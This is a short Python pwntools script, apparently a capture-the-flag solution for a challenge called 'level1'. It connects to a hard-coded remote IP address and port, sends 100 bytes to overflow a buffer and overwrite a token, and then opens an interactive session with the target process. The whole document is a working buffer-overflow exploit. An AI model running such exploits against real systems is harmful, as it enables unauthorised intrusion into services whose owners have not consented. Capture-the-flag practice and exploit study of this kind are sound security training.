from pwn import *

# Init the binary file
elf = ELF('./level1')

# Start the local file or connect to remote
# io = elf.process()
io = remote('3.85.17.84', '1270')

# Send 100 bytes to overflow the buffer
# This fills to buffer an keeps going until it overflows the token
io.sendline(b'a'*100)

# Opens the process in the terminal to see the output and interact
io.interactive()
